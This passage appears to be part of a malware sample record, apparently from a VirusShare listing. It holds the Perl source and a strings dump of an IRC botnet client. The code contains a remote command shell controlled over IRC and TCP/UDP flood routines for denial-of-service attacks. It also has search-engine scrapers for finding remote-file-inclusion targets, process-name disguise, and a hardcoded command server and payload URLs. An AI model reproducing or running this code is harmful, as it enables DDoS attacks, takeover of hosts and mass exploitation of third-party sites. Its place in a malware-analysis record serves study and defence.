{\ndeop(\"$printl\", \"$kem\") if $case eq \"deop\";\nmy $oarg = substr($case, 5);\ndeop(\"$1\", \"$2\") if ($oarg =~ /(\\S+)\\s+(\\S+)/);\n}\n\nif ($case =~ /^msg\\s+(\\S+) (.*)/) {\nmsg(\"$1\", \"$2\");\n}\n\nif ($case =~ /^flood\\s+(\\d+)\\s+(\\S+) (.*)/) {\nfor (my $cf = 1; $cf <= $1; $cf++) {\nmsg(\"$2\", \"$3\");\n}\n}\n\nif ($case =~ /^ctcp\\s+(\\S+) (.*)/) {\nctcp(\"$1\", \"$2\");\n}\n\nif ($case =~ /^ctcpflood\\s+(\\d+)\\s+(\\S+) (.*)/) {\nfor (my $cf = 1; $cf <= $1; $cf++) {\nctcp(\"$2\", \"$3\");\n}\n}\n\nif ($case =~ /^nick (.*)/) {\nnick(\"$1\");\n}\n\nif ($case =~ /^connect\\s+(\\S+)\\s+(\\S+)/) {\nconectar(\"$2\", \"$1\", 6667);\n}\n\nif ($case =~ /^raw (.*)/) {\nsendraw(\"$1\");\n}\n\nif ($case =~ /^eval (.*)/) {\neval \"$1\";\n}\n}\n\n\nsub shell {\nmy $printl=$_[0];\nmy $comando=$_[1];\nif ($comando =~ /cd (.*)/) {\nchdir(\"$1\") || msg(\"$printl\", \"No such file or directory\");\nreturn;\n}\n\nelsif ($pid = fork) {\nwaitpid($pid, 0);\n}\nelse {\nif (fork) {\nexit;\n\n} else {\nmy @resp=`$comando 2>&1 3>&1`;\nmy $c=0;\nforeach my $linha (@resp) {\n  $c++;\n  chop $linha;\n  sendraw($IRC_cur_socket, \"PRIVMSG $printl :$linha\");\n  if ($c == \"$linas_max\") {\n    $c=0;\n    sleep $sleep;\n  }\n}\nexit;\n}\n}\n}\n\nsub tcpflooder {\nmy $itime = time;\nmy ($cur_time);\nmy ($ia,$pa,$proto,$j,$l,$t);\n$ia=inet_aton($_[0]);\n$pa=sockaddr_in($_[1],$ia);\n$ftime=$_[2];\n$proto=getprotobyname('tcp');\n$j=0;$l=0;\n$cur_time = time - $itime;\nwhile ($l<1000){\n$cur_time = time - $itime;\nlast if $cur_time >= $ftime;\n$t=\"SOCK$l\";\nsocket($t,PF_INET,SOCK_STREAM,$proto);\nconnect($t,$pa)||$j--;\n$j++;$l++;\n}\n$l=0;\nwhile ($l<1000){\n$cur_time = time - $itime;\nlast if $cur_time >= $ftime;\n$t=\"SOCK$l\";\nshutdown($t,2);\n$l++;\n}\n}\n\n\n\nsub udpflooder {\nmy $iaddr = inet_aton($_[0]);\nmy $msg = 'A' x $_[1];\nmy $ftime = $_[2];\nmy $cp = 0;\nmy (%pacotes);\n$pacotes{icmp} = $pacotes{igmp} = $pacotes{udp} = $pacotes{o} = $pacotes{tcp} = 0;\nsocket(SOCK1, PF_INET, SOCK_RAW, 2) or $cp++;\nsocket(SOCK2, PF_INET, SOCK_DGRAM, 17) or $cp++;\nsocket(SOCK3, PF_INET, SOCK_RAW, 1) or $cp++;\nsocket(SOCK4, PF_INET, SOCK_RAW, 6) or $cp++;\nreturn(undef) if $cp == 4;\nmy $itime = time;\nmy ($cur_time);\nwhile ( 1 ) {\nfor (my $porta = 1;\n$porta <= 65000; $porta++) {\n$cur_time = time - $itime;\nlast if $cur_time >= $ftime;\nsend(SOCK1, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{igmp}++;\nsend(SOCK2, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{udp}++;\nsend(SOCK3, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{icmp}++;\nsend(SOCK4, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{tcp}++;\n\n\nfor (my $pc = 3;\n$pc <= 255;$pc++) {\nnext if $pc == 6;\n$cur_time = time - $itime;\nlast if $cur_time >= $ftime;\nsocket(SOCK5, PF_INET, SOCK_RAW, $pc) or next;\nsend(SOCK5, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{o}++;\n}\n}\nlast if $cur_time >= $ftime;\n}\nreturn($cur_time, %pacotes);\n}\n\nsub ctcp {\nreturn unless $#_ == 1;\nsendraw(\"PRIVMSG $_[0] :\\001$_[1]\\001\");\n}\n\nsub msg {\nreturn unless $#_ == 1;\nsendraw(\"PRIVMSG $_[0] :$_[1]\");\n}\n\nsub notice {\nreturn unless $#_ == 1;\nsendraw(\"NOTICE $_[0] :$_[1]\");\n}\n\nsub op {\nreturn unless $#_ == 1;\nsendraw(\"MODE $_[0] +o $_[1]\");\n}\n\nsub deop {\nreturn unless $#_ == 1;\nsendraw(\"MODE $_[0] -o $_[1]\");\n}\n\nsub j {\n&join(@_);\n}\n\nsub join {\nreturn unless $#_ == 0;\nsendraw(\"JOIN $_[0]\");\n\n}\nsub p { part(@_);\n}\n\nsub part {\nsendraw(\"PART $_[0]\");\n}\n\nsub nick {\nreturn unless $#_ == 0;\nsendraw(\"NICK $_[0]\");\n}\n\nsub quit {\nsendraw(\"QUIT :$_[0]\");\n}\n\nsub fetch(){\nmy $rnd=(int(rand(9999)));\nmy $n= 80;\nif ($rnd<5000) { $n<<=1;}\nmy $s= (int(rand(10)) * $n);\n{\nmy @dominios = (\"removed-them-all\");\nmy @str;\nforeach $dom  (@dominios)\n{\npush (@str,\"@gstring\");\n}\nmy $query=\"www.google.com/search?q=\";\n$query.=$str[(rand(scalar(@str)))];\n$query.=\"&num=$n&start=$s\";\nmy @lst=();\nsendraw(\"privmsg #debug :DEBUG only test googling: \".$query.\"\");\nmy $page = http_query($query);\nwhile ($page =~  m/<a href=\\\"?http:\\/\\/([^>\\\"]+)\\\"? class=l>/g){\nif ($1 !~ m/google|cache|translate/){\npush (@lst,$1);\n}\n}\nreturn (@lst);\n}\n\nsub msn(){\nmy @lst;\nmy $key = $_[0];\nfor($b=1;$b<=1000;$b+=10){\nmy $MsN=(\"http://search.live.com/results.aspx?q=\".key($key).\"&first=\".$b.\"&FORM=PERE\");\nmy $Res=query($MsN);\nwhile($Res =~ m/<a href=\\\"?http:\\/\\/([^>\\\"]*)\\//g){\nif($1 !~ /msn|live/){\nmy $k=$1;\nmy @grep=links($k);\npush(@lst,@grep);\n}}}\nreturn @lst;\n}\n\nsub yahoo(){\nmy @lst;\nmy $key = $_[0];\nfor($b=1;$b<=1000;$b+=100){\nmy $Ya=(\"http://search.yahoo.co.in/search?ei=UTF-8&p=\".key($key).\"&n=100&fr=sfp&b=\".$b);\nmy $Res=query($Ya);\nwhile($Res =~ m/\\<span class=yschurl>(.+?)\\<\\/span>/g){\nmy $k=$1;\n$k=~s/<b>//g;\n$k=~s/<\\/b>//g;\n$k=~s/<wbr>//g;\nmy @grep=links($k);\npush(@lst,@grep);\n}}\nreturn @lst;\n}\n\nsub yahooa(){\nmy @lst;\nmy $key = $_[0];\nfor($b=210;$b<=1000;$b+=210){\nmy $Ya=(\"http://search.yahoo.hk/search?ei=UTF-8&p=\".key($key).\"&n=100&fr=sfp&b=\".$b);\nmy $Res=query($Ya);\nwhile($Res =~ m/\\<span class=yschurl>(.+?)\\<\\/span>/g){\nmy $k=$1;\n$k=~s/<b>//g;\n$k=~s/<\\/b>//g;\n$k=~s/<wbr>//g;\nmy @grep=links($k);\npush(@lst,@grep);\n}}\nreturn @lst;\n}\n\nsub yahoob(){\nmy @lst;\nmy $key = $_[0];\nfor($b=410;$b<=1000;$b+=210){\nmy $Ya=(\"http://search.yahoo.com/search?ei=UTF-8&p=\".key($key).\"&n=100&fr=sfp&b=\".$b);\nmy $Res=query($Ya);\nwhile($Res =~ m/\\<span class=yschurl>(.+?)\\<\\/span>/g){\nmy $k=$1;\n$k=~s/<b>//g;\n$k=~s/<\\/b>//g;\n$k=~s/<wbr>//g;\nmy @grep=links($k);\npush(@lst,@grep);\n}}\nreturn @lst;\n}\n\nsub yahooc(){\nmy @lst;\nmy $key = $_[0];\nfor($b=610;$b<=1000;$b+=210){\nmy $Ya=(\"http://search.yahoo.com/search?ei=UTF-8&p=\".key($key).\"&n=100&fr=sfp&b=\".$b);\nmy $Res=query($Ya);\nwhile($Res =~ m/\\<span class=yschurl>(.+?)\\<\\/span>/g){\nmy $k=$1;\n$k=~s/<b>//g;\n$k=~s/<\\/b>//g;\n$k=~s/<wbr>//g;\nmy @grep=links($k);\npush(@lst,@grep);\n}}\nreturn @lst;\n}\n\nsub yahood(){\nmy @lst;\nmy $key = $_[0];\nfor($b=810;$b<=1000;$b+=210){\nmy $Ya=(\"http://search.yahoo.com/search?ei=UTF-8&p=\".key($key).\"&n=100&fr=sfp&b=\".$b);\nmy $Res=query($Ya);\nwhile($Res =~ m/\\<span class=yschurl>(.+?)\\<\\/span>/g){\nmy $k=$1;\n$k=~s/<b>//g;\n$k=~s/<\\/b>//g;\n$k=~s/<wbr>//g;\nmy @grep=links($k);\npush(@lst,@grep);\n}}\nreturn @lst;\n}\n\nsub baidu(){\nmy @lst;\nmy $key = $_[0];\nfor($b=0;$b<=1000;$b+=50){\nmy $baidu=(\"http://www.baidu.com/s?lm=0&si=&rn=50&wd=\".key($key).\"&pn=\".$b);\nmy $Res=query($baidu);\nwhile($Res =~ m/<a href=\\\"?http:\\/\\/([^>\\\"]*)\\//g){\nif ($1 !~ /google/){\nmy $k=$1;\nmy @grep=links($k);\npush(@lst,@grep);\n}}}\nreturn @lst;\n}\n\nsub altavista(){ \nmy @lst; \nmy $key = $_[0]; \nfor($b=1;$b<=1000;$b+=10){ \nmy $AlT=(\"http://it.altavista.com/web/results?itag=ody&kgs=0&kls=0&dis=1&q=\".key($key).\"&stq=\".$b); \nmy $Res=query($AlT); \nwhile($Res=~m/<span class=ngrn>(.+?)\\//g){ \nif($1 !~ /altavista/){ \nmy $k=$1; \n$k=~s/<//g; \n$k=~s/ //g; \nmy @grep=links($k); \npush(@lst,@grep); \n}}\nif ($Res =~ /target=\\\"_self\\\">Succ/){}\nelse{return @lst;}\n} \nreturn @lst; \n}\n\nsub naver(){ \nmy @lst; \nmy $key = $_[0]; \nfor($b=1;$b<=1000;$b+=10){ \nmy $naver=(\"http://web.search.naver.com/search.naver?where=webkr&query=\".key($key).\"&xc=&docid=0&qt=df&lang=all&f=&r=&st=s&fd=2&start=\".$i); \nmy $Res=query($naver); \nwhile($Res =~ m/<a href=\\\"http:\\/\\/([^>\\\"]*)/g){ \nmy $k=$1; \nif($k!~/busca|uol|yahoo/){ \nmy $k=$1; \nmy @grep=links($k); \npush(@lst,@grep); \n}}} \nreturn @lst; \n}\n\nsub mozbot() \n{ \nmy @lst; \nmy $key=$_[0]; \nmy $i=0; \nmy $pg=0; \nfor($i=0; $i<=100; $i+=1) \n{ \nmy $mozbot=(\"http://www.mozbot.fr/search?q=\".key($key).\"&st=int&page=\".$i); \nmy $Res=query($mozbot); \nwhile($Res =~ m/<a href=\\\"?http:\\/\\/(.+?)\\\" target/g){ \nmy $k=$1; \n$k=~s/ //g; \nmy @grep=links($k); \npush(@lst,@grep); \n}\nif ($Res =~ /Cliquez ici pour effectuer/)\n{return @lst;}\n} \nreturn @lst; \n} \n\nsub uol(){ \nmy @lst; \nmy $key = $_[0]; \nfor($b=1;$b<=1000;$b+=10){ \nmy $UoL=(\"http://busca.uol.com.br/www/index.html?q=\".key($key).\"&start=\".$i); \nmy $Res=query($UoL); \nwhile($Res =~ m/<a href=\\\"http:\\/\\/([^>\\\"]*)/g){ \nmy $k=$1; \nif($k!~/busca|uol|yahoo/){ \nmy $k=$1; \nmy @grep=links($k); \npush(@lst,@grep); \n}}} \nreturn @lst; \n} \n\nsub ask(){\nmy @lst;\nmy $key=$_[0];\nmy $i=0;\nmy $pg=0;\nfor($i=0; $i<=1000; $i+=10)\n{\nmy $Ask=(\"http://it.ask.com/web?q=\".key($key).\"&o=312&l=dir&qsrc=0&page=\".$i.\"&dm=all\");\nmy $Res=query($Ask);\nwhile($Res=~m/<a id=\\\"(.*?)\\\" class=\\\"(.*?)\\\" href=\\\"(.+?)\\onmousedown/g){\nmy $k=$3;\n$k=~s/[\\\"\\ ]//g;\nmy @grep=links($k);\npush(@lst,@grep);\n}}\nreturn @lst;\n}\n\nsub alltheweb()\n{\nmy @lst;\nmy $key=$_[0];\nmy $i=0;\nmy $pg=0;\nfor($i=0; $i<=1000; $i+=100)\n{\nmy $all=(\"http://www.alltheweb.com/search?cat=web&_sb_lang=any&hits=100&q=\".key($key).\"&o=\".$i);\nmy $Res=query($all);\nwhile($Res =~ m/<span class=\\\"?resURL\\\"?>http:\\/\\/(.+?)\\<\\/span>/g){\nmy $k=$1;\n$k=~s/ //g;\nmy @grep=links($k);\npush(@lst,@grep);\n}}\nreturn @lst;\n}\n\nsub google(){\nmy @lst;\nmy $key = $_[0];\nfor($b=0;$b<=1000;$b+=100){\nmy $Go=(\"http://www.google.com/search?hl=en&q=\".key($key).\"&meta=&num=100&filter=0&start=\".$b);\nmy $Res=query($Go);\nwhile($Res =~ m/<a href=\\\"?http:\\/\\/([^>\\\"]*)\\//g){\nif ($1 !~ /google/){\nmy $k=$1;\nmy @grep=links($k);\npush(@lst,@grep);\n}}}\nreturn @lst;\n}\n\nsub guruji(){\nmy @lst;\nmy $key = $_[0];\nfor($b=0;$b<=1000;$b+=10){\nmy $guruji=(\"http://www.guruji.com/search?q=\".key($key).\"&s=\".$b);\nmy $Res=query($guruji);\nwhile($Res =~ m/<a href=\\\"?http:\\/\\/([^>\\\"]*)\\//g){\nif ($1 !~ /google/){\nmy $k=$1;\nmy @grep=links($k);\npush(@lst,@grep);\n}}}\nreturn @lst;\n}\n\nsub fireball(){\nmy $key=$_[0];\nmy $inizio=1;\nmy $pagine=200;\nmy @lst;\nmy $av=0;\nwhile($inizio <= $pagine){\nmy $fireball=\"http://suche.fireball.de/cgi-bin/pursuit?pag=$av&query=\".key($key).\"&cat=fb_loc&idx=all&enc=utf-8\";\nmy $Res=query($fireball);\nwhile ($Res=~ m/<a href=\\\"?http:\\/\\/(.+?)\\//g ){\nif ($1 !~ /msn|live|google|yahoo/){\nmy $k=\"$1/\";\nmy @grep=links($k);\npush(@lst,@grep);\n}}\n$av=$av+10;\n$inizio++;\n}\nreturn @lst;\n}\n\nsub links()\n{\nmy @l;\nmy $link=$_[0];\nmy $host=$_[0];\nmy $hdir=$_[0];\n$hdir=~s/(.*)\\/[^\\/]*$/\\1/;\n$host=~s/([-a-zA-Z0-9\\.]+)\\/.*/$1/;\n$host.=\"/\";\n$link.=\"/\";\n$hdir.=\"/\";\n$host=~s/\\/\\//\\//g;\n$hdir=~s/\\/\\//\\//g;\n$link=~s/\\/\\//\\//g;\npush(@l,$link,$host,$hdir);\nreturn @l;\n}\n\nsub geths(){\nmy $host=$_[0];\n$host=~s/([-a-zA-Z0-9\\.]+)\\/.*/$1/;\nreturn $host;\n}\n\nsub key(){\nmy $chiave=$_[0];\n$chiave =~ s/ /\\+/g;\n$chiave =~ s/:/\\%3A/g;\n$chiave =~ s/\\//\\%2F/g;\n$chiave =~ s/&/\\%26/g;\n$chiave =~ s/\\\"/\\%22/g;\n$chiave =~ s/,/\\%2C/g;\n$chiave =~ s/\\\\/\\%5C/g;\nreturn $chiave;\n}\n\nsub query($){\nmy $url=$_[0];\n$url=~s/http:\\/\\///;\nmy $host=$url;\nmy $query=$url;\nmy $page=\"\";\n$host=~s/href=\\\"?http:\\/\\///;\n$host=~s/([-a-zA-Z0-9\\.]+)\\/.*/$1/;\n$query=~s/$host//;\nif ($query eq \"\") {$query=\"/\";};\neval {\nmy $sock = IO::Socket::INET->new(PeerAddr=>\"$host\",PeerPort=>\"80\",Proto=>\"tcp\") or return;\nprint $sock \"GET $query HTTP/1.0\\r\\nHost: $host\\r\\nAccept: */*\\r\\nUser-Agent: Mozilla/5.0\\r\\n\\r\\n\";\nmy @r = <$sock>;\n$page=\"@r\";\nclose($sock);\n};\nreturn $page;\n}\n\nsub unici{\nmy @unici = ();\nmy %visti = ();\nforeach my $elemento ( @_ )\n{\nnext if $visti{ $elemento }++;\npush @unici, $elemento;\n}\nreturn @unici;\n}\n\nsub http_query($){\nmy ($url) = @_;\nmy $host=$url;\nmy $query=$url;\nmy $page=\"\";\n$host =~ s/href=\\\"?http:\\/\\///;\n$host =~ s/([-a-zA-Z0-9\\.]+)\\/.*/$1/;\n$query =~s/$host//;\nif ($query eq \"\") {$query=\"/\";};\neval {\nlocal $SIG{ALRM} = sub { die \"1\";};\nalarm 10;\nmy $sock = IO::Socket::INET->new(PeerAddr=>\"$host\",PeerPort=>\"80\",Proto=>\"tcp\") or return;\nprint $sock \"GET $query HTTP/1.0\\r\\nHost: $host\\r\\nAccept: */*\\r\\nUser-Agent: Mozilla/5.0\\r\\n\\r\\n\";\nmy @r = <$sock>;\n$page=\"@r\";\nalarm 0;\nclose($sock);\n};\nreturn $page;\n}\n}"
    },
    "filename": "VirusShare_13d48612bb5e108bd02aa9fc17a80031",
    "filesize": 53222,
    "filetype": "a /usr/bin/perl script executable (binary data)",
    "hashes": {
        "md5": "13d48612bb5e108bd02aa9fc17a80031",
        "sha1": "4cae9d469c52fcbcb7d96d0562633133726b2978",
        "sha256": "ea168dce8e8349734bdc9146ab8e12c690fe0ef0a803c5ea950beddfb31046f3"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "#!/usr/bin/perl",
            "use HTTP::Request;",
            "use LWP::UserAgent;",
            "my $processo = '[httpd]';",
            "my $linas_max='4';",
            "my $sleep='6';",
            "my $cmd=\"http://kendall-web-lab.com/h.txt?\";",
            "my $id=\"http://www.greenhealth-bg.com///administrator/components/com_virtuemart/html/id.txt?\";",
            "my @adms=(\"Ha45K\",\"TijN\");",
            "my @canais=(\"#e109#\");",
            "my @nickname = (\"None\".int(rand(1000)));",
            "my $nick = $nickname[rand scalar @nickname];",
            "my $ircname ='None';",
            "chop (my $realname = 'NoThink');",
            "$servidor='gangbang.mytijn.org' unless $servidor;",
            "my $porta='23232';",
            "$SIG{'INT'} = 'IGNORE';",
            "$SIG{'HUP'} = 'IGNORE';",
            "$SIG{'TERM'} = 'IGNORE';",
            "$SIG{'CHLD'} = 'IGNORE';",
            "$SIG{'PS'} = 'IGNORE';",
            "use IO::Socket;",
            "use Socket;",
            "use IO::Select;",
            "chdir(\"/\");",
            "#Connect",
            "$servidor=\"$ARGV[0]\" if $ARGV[0];",
            "$0=\"$processo\".\"\\0\"x16;;",
            "my $pid=fork;",
            "exit if $pid;",
            "die \"Masalah fork: $!\" unless defined($pid);",
            "our %irc_servers;",
            "our %DCC;",
            "my $dcc_sel = new IO::Select->new();",
            "$sel_cliente = IO::Select->new();",
            "sub sendraw {",
            "  if ($#_ == '1') {",
            "    my $socket = $_[0];",
            "    print $socket \"$_[1]\\n\";",
            "    } else {",
            "    print $IRC_cur_socket \"$_[0]\\n\";",
            "sub conectar {",
            "  my $meunick = $_[0];",
            "  my $servidor_con = $_[1];",
            "  my $porta_con = $_[2];",
            "  my $IRC_socket = IO::Socket::INET->new(Proto=>\"tcp\", PeerAddr=>\"$servidor_con\",",
            "  PeerPort=>$porta_con) or return(1);",
            "  if (defined($IRC_socket)) {",
            "    $IRC_cur_socket = $IRC_socket;",
            "    $IRC_socket->autoflush(1);",
            "    $sel_cliente->add($IRC_socket);",
            "    $irc_servers{$IRC_cur_socket}{'host'} = \"$servidor_con\";",
            "    $irc_servers{$IRC_cur_socket}{'porta'} = \"$porta_con\";",
            "    $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;",
            "    $irc_servers{$IRC_cur_socket}{'meuip'} = $IRC_socket->sockhost;",
            "    nick(\"$meunick\");",
            "    sendraw(\"USER $ircname \".$IRC_socket->sockhost.\" $servidor_con :$realname\");",
            "    sleep 1;",
            "my $line_temp;",
            "while( 1 ) {",
            "  while (!(keys(%irc_servers))) { conectar(\"$nick\", \"$servidor\", \"$porta\"); }",
            "  delete($irc_servers{''}) if (defined($irc_servers{''}));",
            "  my @ready = $sel_cliente->can_read(0);",
            "  next unless(@ready);",
            "  foreach $fh (@ready) {",
            "    $IRC_cur_socket = $fh;",
            "    $meunick = $irc_servers{$IRC_cur_socket}{'nick'};",
            "    $nread = sysread($fh, $msg, 4096);",
            "    if ($nread == 0) {",
            "      $sel_cliente->remove($fh);",
            "      $fh->close;",
            "      delete($irc_servers{$fh});",
            "    }",
            "    @lines = split (/\\n/, $msg);",
            "    for(my $c=0; $c<= $#lines; $c++) {",
            "      $line = $lines[$c];",
            "      $line=$line_temp.$line if ($line_temp);",
            "      $line_temp='';",
            "      $line =~ s/\\r$//;",
            "      unless ($c == $#lines) {",
            "        parse(\"$line\");",
            "        } else {",
            "        if ($#lines == 0) {",
            "          parse(\"$line\");",
            "          } elsif ($lines[$c] =~ /\\r$/) {",
            "          parse(\"$line\");",
            "          } elsif ($line =~ /^(\\S+) NOTICE AUTH :\\*\\*\\*/) {",
            "          parse(\"$line\");",
            "          \t   } else {",
            "          \t               $line_temp = $line;",
            "        }",
            "      }",
            "    }",
            "sub parse {",
            "  my $servarg = shift;",
            "  if ($servarg =~ /^PING \\:(.*)/) {",
            "    sendraw(\"PONG :$1\");",
            "    } elsif ($servarg =~ /^\\:(.+?)\\!(.+?)\\@(.+?) PRIVMSG (.+?) \\:(.+)/) {",
            "    my $pn=$1; my $hostmask= $3; my $onde = $4; my $args = $5;",
            "    if ($args =~ /^\\001VERSION\\001$/) {",
            "      \t notice(\"$pn\", \"\\001VERSION mIRC v6.17 PitBull\\001\");",
            "    }",
            "    if (grep {$_ =~ /^\\Q$pn\\E$/i } @adms ) {",
            "    if ($onde eq \"$meunick\"){",
            "    shell(\"$pn\", \"$args\");",
            "#End of Connect",
            "######################",
            "#      PREFIX        #",
            "#                    #",
            "######################",
            "# You can change the prefix if you want but the commands will be different",
            "# The standard prefix is !x if you change it into !xitch for example",
            "# every command will be like !xitch @udpflood, !xitch @googlescan.",
            "# So its recommended not to change this ;)",
            "######################",
            "  if ($args =~ /^(\\Q$meunick\\E|\\!x)\\s+(.*)/ ) {",
            "    my $natrix = $1;",
            "    my $arg = $2;",
            "    if ($arg =~ /^\\!(.*)/) {",
            "      ircase(\"$pn\",\"$onde\",\"$1\") unless ($natrix eq \"!x\" and $arg =~ /^\\!nick/);",
            "      } elsif ($arg =~ /^\\@(.*)/) {",
            "      $ondep = $onde;",
            "      $ondep = $pn if $onde eq $meunick;",
            "      bfunc(\"$ondep\",\"$1\");",
            "      } else {",
            "      shell(\"$onde\", \"$arg\");",
            "    }",
            "######################",
            "#   End of PREFIX    #",
            "#                    #",
            "######################",
            "elsif ($servarg =~ /^\\:(.+?)\\!(.+?)\\@(.+?)\\s+NICK\\s+\\:(\\S+)/i) {",
            "if (lc($1) eq lc($meunick)) {",
            "  $meunick=$4;",
            "  $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;",
            "} elsif ($servarg =~ m/^\\:(.+?)\\s+433/i) {",
            "nick(\"$meunick\".int rand(999999));",
            "} elsif ($servarg =~ m/^\\:(.+?)\\s+001\\s+(\\S+)\\s/i) {",
            "$meunick = $2;",
            "$irc_servers{$IRC_cur_socket}{'nick'} = $meunick;",
            "$irc_servers{$IRC_cur_socket}{'nome'} = \"$1\";",
            "foreach my $canal (@canais) {",
            "  sendraw(\"JOIN $canal ddosit\");",
            "} elsif ($servarg =~ m/^\\:(.+?)\\s+002\\s+(\\S+)\\s/i) {",
            "foreach my $canal (@canais) { sendraw(\"JOIN $canal ddosit\"); }",
            "} elsif ($servarg =~ m/^\\:(.+?)\\s+003\\s+(\\S+)\\s/i) {",
            "foreach my $canal (@canais) { sendraw(\"JOIN $canal ddosit\"); }",
            "} elsif ($servarg =~ m/^\\:(.+?)\\s+004\\s+(\\S+)\\s/i) {",
            "foreach my $canal (@canais) { sendraw(\"JOIN $canal ddosit\"); }",
            "} elsif ($servarg =~ m/^\\:(.+?)\\s+005\\s+(\\S+)\\s/i) {",
            "foreach my $canal (@canais) { sendraw(\"JOIN $canal ddosit\"); }",
            "sub bfunc {",
            "my $printl = $_[0];",
            "my $funcarg = $_[1];",
            "if (my $pid = fork) {",
            "waitpid($pid, 0);",
            "} else {",
            "if (fork) {",
            "  exit;",
            "} else {",
            "######################",
            "#       Help         #",
            "#                    #",
            "######################",
            "if ($funcarg =~ /^help/) {",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2Help",
            "3 Scanner edit by ",
            "2MasterKid\");",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2Help",
            "3 !x ",
            "ddos\");",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2Help",
            "3 !x ",
            "rfi\");",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2Help",
            "3 !x ",
            "backconnect\");",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2Help",
            "3 !x ",
            "shell\");",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2Help",
            "3 !x ",
            "portscanner\");",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2Help",
            "3 !x ",
            "commands\");",
            "if ($funcarg =~ /^ddos/) {",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2Help",
            "3 There are 3 DDos in this bot\");",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2Help",
            "3 UDPFlood, HTTPFlood and TCPFlood\");",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2Help",
            "3 !x ",
            "udpflood ",
            "3<ip> <packet size> <time>\");",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2Help",
            "3 !x ",
            "tcpflood ",
            "3<ip> <port> <packet size> <time>\");",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2Help",
            "3 !x ",
            "httpflood ",
            "3<site> <time>\");",
            "#if ($funcarg =~ /^rfi/) {",
            "#\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2Help",
            "3 This bot also contains a RFI Scanner.\");",
            "#\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2Help",
            "3 That contains the engines :",
            "7AOL, ",
            "6ahoo",
            " \");",
            "#\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2Help",
            "3 Commands :\");",
            "#\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2Help",
            "3 !x ",
            "rfi ",
            "3<vuln> <dork>\");",
            "#\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2Help",
            "3 You can find strings here : http://www.xshqiptaretx.org/strings.txt \");",
            "if ($funcarg =~ /^backconnect/) {",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2Help",
            "3 You use backconnect like this :\");",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2Help",
            "3 !x ",
            "back ",
            "3<ip><port>\");",
            "if ($funcarg =~ /^shell/) {",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2Help",
            "3 This bot has a integrated shell\");",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2Help",
            "3 You can use it in private but also public in the channel\");",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2Help",
            "3 In public channel just use : ",
            "2!x cd tmp",
            "3 for example\");",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2Help",
            "3 For help with the linux commands type :",
            "linuxhelp\");",
            "if ($funcarg =~ /^portscanner/) {",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2Help",
            "3 There is a normal portscan and a Nmap:\");",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2Help",
            "3 !x ",
            "portscan ",
            "3<ip>\");",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2Help",
            "3 !x ",
            "nmap ",
            "3<ip> <beginport> <endport>\");",
            "if ($funcarg =~ /^commands/) {",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2Help",
            "3 You can use the following commands :\");",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2Help",
            "3 !x ",
            "portscan ",
            "3<ip>\");",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2Help",
            "3 !x ",
            "nmap ",
            "3<ip> <beginport> <endport>\");",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2Help",
            "3 !x ",
            "back ",
            "3<ip><port>\");",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2Help",
            "3 !x cd tmp for example\");",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2Help",
            "3 !x ",
            "udpflood ",
            "3<ip> <packet size> <time>\");",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2Help",
            "3 !x ",
            "tcpflood ",
            "3<ip> <port> <packet size> <time>\");",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2Help",
            "3 !x ",
            "httpflood ",
            "3<site> <time>\");",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2Help",
            "3 !x ",
            "linuxhelp\");",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2Help",
            "3 !x ",
            "rfi ",
            "3<vuln> <dork>\");",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2Help",
            "3 !x ",
            "system\");",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2Help",
            "3 !x ",
            "logcleaner\");",
            "\tsendraw($IRC_cur_socket, \"PRIVMSG $printl :",
            "2Help",
            "3 !x ",
            "sendmail ",
            "3<subject> <sender> <recipient> <message>\");",
